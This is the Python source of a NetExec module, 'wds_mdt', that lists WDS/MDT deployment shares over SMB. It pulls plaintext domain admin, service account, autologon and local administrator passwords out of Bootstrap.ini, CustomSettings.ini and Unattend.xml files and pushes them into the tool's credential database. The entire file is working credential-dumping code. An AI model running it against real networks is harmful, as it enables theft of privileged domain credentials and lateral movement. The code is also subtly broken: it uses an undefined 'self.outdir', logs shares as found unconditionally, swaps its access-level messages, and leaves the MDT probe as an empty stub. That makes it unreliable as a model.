import re
import os
from os.path import join
from io import BytesIO
from nxc.helpers.misc import CATEGORY
from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH


CRED_KEYWORDS = [
    "DomainAdmin", "DomainAdminPassword",
    "UserID", "UserPassword",
    "JoinDomain", "DomainAdminDomain", "UserDomain",
    "MachineObjectOU",
]

# Match only the exact config filenames - avoids false positives on .vbs/.exe
SENSITIVE_REGEXES = [
    re.compile(r"bootstrap\.ini$", re.I),
    re.compile(r"customsettings\.ini$", re.I),
    re.compile(r"unattend\.xml$", re.I),
]

WIM_REGEX = re.compile(r"\.wim$", re.I)

# WinPE boot images are typically 300-600 MB; install.wim easily exceeds 5 GB.
# Anything under 1 GB is almost certainly a PE, not an OS image.
WIM_MAX_SIZE = 1 * 1024 * 1024 * 1024


def _extract_key_values(content, keys):
    """Parse INI-style key=value pairs, handling quoted and unquoted values."""
    results = []
    text = content.replace("\r\n", "\n").replace("\r", "\n")
    for key in keys:
        patt = re.compile(
            rf'(?im)^\s*{re.escape(key)}\s*=\s*(?:"([^"]*)"|\'([^\']*)\'|([^\n]+))\s*$'
        )
        for m in patt.finditer(text):
            val = (m.group(1) or m.group(2) or m.group(3) or "").strip()
            results.append(f"{key}={val}")
    return results


def _extract_xml_credentials(content):
    """
    Extract credentials from WDS/MDT Unattend.xml structures.

    Processes each named block independently to avoid duplicates -
    flat <Username>/<Password> tags are only matched outside known nested blocks.
    """
    results = []

    # Strip known nested blocks first so flat tag matching does not produce duplicates.
    stripped = content
    for block_tag in ("AutoLogon", "Credentials", "AdministratorPassword"):
        stripped = re.sub(
            rf"<{block_tag}>.*?</{block_tag}>", "", stripped,
            flags=re.IGNORECASE | re.DOTALL
        )

    # Flat tags - safe to match now that nested blocks are removed.
    for key, patt in [
        ("Username", r"<Username>\s*([^<]+)\s*</Username>"),
        ("Password", r"<Password>\s*([^<]+)\s*</Password>"),
    ]:
        results.extend(f"{key}={val.strip()}" for val in re.findall(patt, stripped, flags=re.IGNORECASE))

    # AutoLogon block - Password nested under <Password><Value>
    m = re.search(r"<AutoLogon>(.*?)</AutoLogon>", content, flags=re.IGNORECASE | re.DOTALL)
    if m:
        block = m.group(1)
        for tag, patt in [
            ("AutoLogon.Username", r"<Username>\s*([^<]+)\s*</Username>"),
            ("AutoLogon.Password", r"<Value>\s*([^<]+)\s*</Value>"),
        ]:
            hit = re.search(patt, block, flags=re.IGNORECASE)
            if hit:
                results.append(f"{tag}={hit.group(1).strip()}")

    # Credentials block - domain join account
    m = re.search(r"<Credentials>(.*?)</Credentials>", content, flags=re.IGNORECASE | re.DOTALL)
    if m:
        block = m.group(1)
        for tag, patt in [
            ("Credentials.Domain", r"<Domain>\s*([^<]+)\s*</Domain>"),
            ("Credentials.Username", r"<Username>\s*([^<]+)\s*</Username>"),
            ("Credentials.Password", r"<Password>\s*([^<]+)\s*</Password>"),
        ]:
            hit = re.search(patt, block, flags=re.IGNORECASE)
            if hit:
                results.append(f"{tag}={hit.group(1).strip()}")

    # AdministratorPassword - always nested under <Value>
    m = re.search(
        r"<AdministratorPassword>.*?<Value>\s*([^<]+)\s*</Value>.*?</AdministratorPassword>",
        content, flags=re.IGNORECASE | re.DOTALL
    )
    if m:
        results.append(f"AdministratorPassword={m.group(1).strip()}")

    return results


def _cred_scan(content):
    """
    Best-effort credential extraction from a decoded file.
    Priority: INI key=value > XML tags > bare keyword presence (fallback).
    """
    if not content:
        return []
    if isinstance(content, (bytes, bytearray)):
        content = content.decode("utf-8", errors="ignore")
    # High null-byte density means likely binary, skip
    if content.count("\x00") > 5:
        return []

    lower = content.lower()

    kvs = _extract_key_values(content, CRED_KEYWORDS)
    if kvs:
        return kvs

    if any(tag in lower for tag in ("<username>", "<password>", "<administratorpassword>")):
        xml_hits = _extract_xml_credentials(content)
        if xml_hits:
            return xml_hits

    # Fallback: at least signal which sensitive keys are present, even without values
    return [kw for kw in CRED_KEYWORDS if kw.lower() in lower]


class NXCModule:
    """
    Detect WDS/MDT deployment shares and extract credentials from configuration files.

    Targets:
      - REMINST / REMOTEINSTALL : world-readable on any WDS server (any domain user)
      - DeploymentShare$        : MDT share, admin-only or misconfigured ACL

    Sensitive files: Bootstrap.ini, CustomSettings.ini, Unattend.xml, *.wim (WinPE only)
    Credentials are automatically extracted in-memory and pushed to the NXC database.

    Module by @archidote - https://github.com/archidote
    """

    name = "wds_mdt"
    description = r"Detect PXE WDS/MDT SMB shares (REMINST\, DeploymentShare$\) and retrieve credentials from deployment files."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """DOWNLOAD  Download all found files (INI/XML + WinPE .wim < 1 GB)  (default: false)"""
        self.download = module_options.get("DOWNLOAD", "false").lower() == "true"
        self.output_path = join(NXC_PATH, "modules", "wds_mdt")

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection
        os.makedirs(self.output_path, exist_ok=True)

        for share in connection.conn.listShares():
            name = share["shi1_netname"].rstrip("\x00").lower()
            if name in {"reminst", "remoteinstall"}:
                self.explore_wds(name)
            elif name in {"deploymentshare$"}:
                self.explore_mdt(name)

        for wds_share in ["REMINST", "REMOTEINSTALL", "DeploymentShare$"]:
            is_privileged = wds_share.lower() in {"deploymentshare$"}
            access_note = "admin access or misconfigured ACLs" if is_privileged else "standard user access"
            context.log.success(f"Found share: {wds_share} ({access_note})")

            try:
                paths = _walk_share(connection, wds_share)
            except Exception as e:
                context.log.debug(f"walk({wds_share}) failed: {e}")
                continue

            for path, file_size in paths:
                context.log.debug(f"Found {path}")

                buf = BytesIO()
                try:
                    connection.conn.getFile(wds_share, "\\" + path, buf.write)
                except Exception as e:
                    context.log.debug(f"getFile({path}) failed: {e}")
                    continue

                hits = _cred_scan(_decode(buf.getvalue()))

                if hits:
                    context.log.success(f"Credentials found in {path}")
                    for hit in hits:
                        context.log.highlight(f"  {hit}")

                    # Push reconstructed credential pairs into the NXC database
                    for cred in _parse_creds(hits):
                        try:
                            context.db.add_credential(
                                "plaintext",
                                cred["domain"],
                                cred["username"],
                                cred["password"],
                            )
                            context.log.debug(
                                f"Credential added to db: {cred['domain']}\\{cred['username']}"
                            )
                        except Exception as e:
                            context.log.debug(f"db.add_credential failed: {e}")
                else:
                    context.log.debug(f"No credentials found in {path}")

                if self.download:
                    local = _download(context, connection, wds_share, "\\" + path, self.outdir)
                    if local:
                        context.log.success(f"Saved: {local}")

    def explore_wds(self, share):
        """
        Shares to explore: REMINST/REMOTEINSTALL
        Note: Readable by any authenticated domain user by default.
        """
        self.context.log.success(f"Found share: {share} (admin access or misconfigured ACLs)")
        extract_files = []
        for path in ("\\Boot\\x64\\Images\\*", "\\Boot\\x86\\Images\\*"):
            content = self.connection.conn.listPath(share, path)
            wmi_files = [entry for entry in content if re.compile(r"\.wim$", re.I).search(entry.get_longname())]
            for entry in wmi_files:
                self.context.log.success(f"Found WinPE image: {path}\\{entry.get_longname()} ({entry.get_filesize() / (1024 * 1024):.0f} MB)")
                if entry.get_filesize() < WIM_MAX_SIZE:
                    try:
                        os.makedirs(join(self.output_path, "wmi_files"), exist_ok=True)
                        with open(join(self.output_path, "wmi_files", sanitize_path_component(f"{self.connection.host}_{entry.get_longname()}")), "wb") as fh:
                            self.connection.conn.getFile(share, path.rstrip("\\*") + "\\" + entry.get_longname(), fh.write)
                        extract_files.append(join(self.output_path, "wmi_files", sanitize_path_component(f"{self.connection.host}_{entry.get_longname()}")))
                        self.context.log.success(f"Saved WinPE: {path}\\{entry.get_longname()}")
                    except Exception as e:
                        self.context.log.fail(f"Failed to download {path}\\{entry.get_longname()}: {e}")

        if extract_files:
            self.context.log.display("You need to manually extract the image to try gathering credentials (use 7zip or wimlib-imagex).")
            self.context.log.display(r"Check out the paths: 'Deploy\Scripts\Bootstrap.ini' and 'Deploy\Scripts\CustomSettings.ini'")

    def explore_mdt(self, share):
        """
        Shares to explore: DeploymentShare$
        Note: Hidden by default, requires admin rights or misconfigured ACLs.
        If we can list it, it's either intentional access or a misconfiguration worth noting.
        """
        self.context.log.success(f"Found share: {share} (standard user access)")
        # Probe access silently - failure is expected on hardened configs
        try:
            # print(self.connection.conn.listPath(share, "\\*"))
            pass
        except Exception:
            self.context.log.debug(f"{share} found but not readable (expected for protected MDT share)")
            return


def _parse_creds(hits):
    """
    Reconstruct (username, password, domain) tuples from raw key=value hits.
    Handles both INI-style pairs and XML-structured blocks (AutoLogon, Credentials).
    Returns a list of dicts ready for context.db.add_credential().
    """
    kv = {}
    for hit in hits:
        if "=" in hit:
            key, _, val = hit.partition("=")
            kv[key.strip()] = val.strip()

    credentials = []

    # Domain admin account from CustomSettings.ini
    if "DomainAdmin" in kv and "DomainAdminPassword" in kv:
        credentials.append({
            "username": kv["DomainAdmin"],
            "password": kv["DomainAdminPassword"],
            "domain": kv.get("DomainAdminDomain") or kv.get("JoinDomain", ""),
        })

    # Service account from Bootstrap.ini
    if "UserID" in kv and "UserPassword" in kv:
        credentials.append({
            "username": kv["UserID"],
            "password": kv["UserPassword"],
            "domain": kv.get("UserDomain", ""),
        })

    # Domain join account from Unattend.xml Credentials block
    if "Credentials.Username" in kv and "Credentials.Password" in kv:
        credentials.append({
            "username": kv["Credentials.Username"],
            "password": kv["Credentials.Password"],
            "domain": kv.get("Credentials.Domain", ""),
        })

    # AutoLogon account from Unattend.xml
    if "AutoLogon.Username" in kv and "AutoLogon.Password" in kv:
        credentials.append({
            "username": kv["AutoLogon.Username"],
            "password": kv["AutoLogon.Password"],
            "domain": "",  # AutoLogon is typically a local account
        })

    # Local administrator password from the Unattend.xml
    if "AdministratorPassword" in kv:
        credentials.append({
            "username": "Administrator",
            "password": kv["AdministratorPassword"],
            "domain": "",
        })

    return credentials


def _walk_share(connection, share, path=""):
    """
    Recursively yield (remote_path, file_size) for sensitive files in *share*.

    Impacket quirks:
      - Root listing expects an empty string, not "/"
      - Paths use backslashes, no leading separator
      - File metadata via .get_longname(), .is_directory(), .get_filesize()
    """
    try:
        entries = connection.conn.listPath(share, (path or "") + "\\*")
    except Exception:
        return

    for entry in entries:
        name = entry.get_longname()
        if name in (".", ".."):
            continue

        full = (path + "\\" + name).lstrip("\\")

        if entry.is_directory():
            yield from _walk_share(connection, share, full)
            continue

        if any(p.search(name) for p in SENSITIVE_REGEXES) or WIM_REGEX.search(name):
            yield full, entry.get_filesize()


def _decode(raw: bytes) -> str:
    """Decode raw bytes with BOM detection and multi-encoding fallback."""
    if not raw:
        return ""
    if raw.startswith(b"\xef\xbb\xbf"):
        return raw.decode("utf-8-sig", errors="ignore")
    if raw.startswith((b"\xff\xfe", b"\xfe\xff")):
        return raw.decode("utf-16", errors="ignore")
    if raw.count(b"\x00") > len(raw) * 0.1:
        try:
            return raw.decode("utf-16-le", errors="ignore")
        except Exception:
            pass
    for enc in ("utf-8", "latin-1"):
        try:
            return raw.decode(enc, errors="ignore")
        except Exception:
            continue
    return ""


def _download(context, connection, share, remote_path, local_dir) -> str | None:
    """Download *remote_path* from *share* and prefix the filename with the server identifier."""
    try:
        os.makedirs(local_dir, exist_ok=True)
        # Best-effort server name: NetBIOS name > hostname attribute > IP
        hostname = (
            getattr(connection, "remoteName", None)
            or getattr(connection, "hostname", None)
            or connection.host
        )
        # remote_path arrives as \Dir\file.ext - strip leading separators before splitting
        clean = remote_path.strip("\\").strip("/")
        basename = clean.replace("/", "\\").split("\\")[-1]
        local_path = os.path.join(local_dir, f"{hostname}_{basename}")
        with open(local_path, "wb") as fh:
            connection.conn.getFile(share, remote_path, fh.write)
        return local_path
    except Exception as e:
        context.log.debug(f"Download failed ({remote_path}): {e}")
        return None
